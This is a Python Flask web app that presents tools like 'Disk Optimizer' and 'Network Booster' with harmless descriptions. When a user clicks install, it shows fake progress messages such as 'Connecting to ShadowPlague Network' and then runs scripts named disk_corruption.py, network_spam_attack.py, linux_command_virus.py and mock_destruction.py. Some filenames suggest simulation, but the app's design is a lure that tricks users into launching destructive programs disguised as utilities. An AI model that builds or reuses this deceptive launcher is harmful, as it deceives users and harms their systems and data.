import os
import subprocess
import threading
import time
from flask import Flask, render_template, request, jsonify
import random

app = Flask(__name__)

CONFIG = {
    "fake_base": os.path.expanduser("~/Downloads/system_root"),
    "modules": {
        "InstaBooster Tool": {"script": "insta_liker_fake.py", "desc": "Skyrocket your Instagram presence with automated likes and followers."},
        "BIOS Override Tool": {"script": "bios_override_simulation.py", "desc": "Unlock advanced firmware controls for system optimization."},
        "Disk Optimizer": {"script": "disk_corruption.py", "desc": "Maximize disk performance with deep-level formatting."},
        "Network Booster": {"script": "network_spam_attack.py", "desc": "Enhance network throughput with aggressive packet routing."},
        "Terminal Utilities": {"script": "linux_command_virus.py", "desc": "Execute advanced system diagnostics via terminal."},
        "Visual Calibrator": {"script": "screen_flicker.py", "desc": "Calibrate display output for optimal performance."},
        "Linux OS Analyzer": {"script": "mock_destruction.py", "desc": "Analyze and clean system logs for security."},
        "Image Optimizer": {"script": "image_flood_simulation.py", "desc": "Optimize image rendering for high-speed display."}
    }
}

def create_fake_system():
    if not os.path.exists(CONFIG["fake_base"]):
        os.makedirs(CONFIG["fake_base"])
        for i in range(10):
            with open(os.path.join(CONFIG["fake_base"], f"dummy_file_{i}.txt"), "w") as f:
                f.write("This is a fake file for testing.")

@app.route('/')
def index():
    create_fake_system()
    return render_template('index.html', modules=CONFIG["modules"])

@app.route('/install/<module_name>', methods=['POST'])
def install(module_name):
    if module_name not in CONFIG["modules"]:
        return jsonify({"status": "error", "message": "Invalid module"})
    
    script = CONFIG["modules"][module_name]["script"]
    if not os.path.exists(script):
        return jsonify({"status": "error", "message": f"Script {script} not found"})
    
    steps = [
        "Connecting to ShadowPlague Network...",
        "Verifying Tool License...",
        "Authenticating Session...",
        "Downloading Required Packages...",
        "Preparing Tool Environment...",
        "Compiling Dependencies...",
        "Installation Complete!"
    ]
    for step in steps:
        time.sleep(random.uniform(0.7, 1.4))
    
    try:
        subprocess.Popen(["python3", script])
        return jsonify({"status": "success", "message": "Module launched"})
    except Exception as e:
        return jsonify({"status": "error", "message": f"Failed to launch module: {str(e)}"})

if __name__ == "__main__":
    app.run(debug=True)